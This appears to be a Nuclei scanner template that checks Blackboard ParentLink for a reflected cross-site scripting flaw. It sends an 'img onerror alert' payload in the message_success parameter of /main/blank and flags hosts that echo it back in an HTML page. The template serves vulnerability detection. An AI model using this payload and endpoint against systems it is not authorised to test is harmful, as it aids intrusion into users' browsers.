id: parentlink-xss1
info:
  author: r3naissance
  name: Blackboard ParentLink Reflected XSS
  reference: https://help.blackboard.com/Community_Engagement/Administrator/Release_Notes
  severity: medium
  tags: blackboard,parentlink,xss
requests:
- matchers:
  - part: body
    type: word
    words:
    - <img src=c onerror=alert(8675309)>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /main/blank?message_success=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
    HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate

    Accept: */*

    Connection: close

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36
    (KHTML, like Gecko)

    '
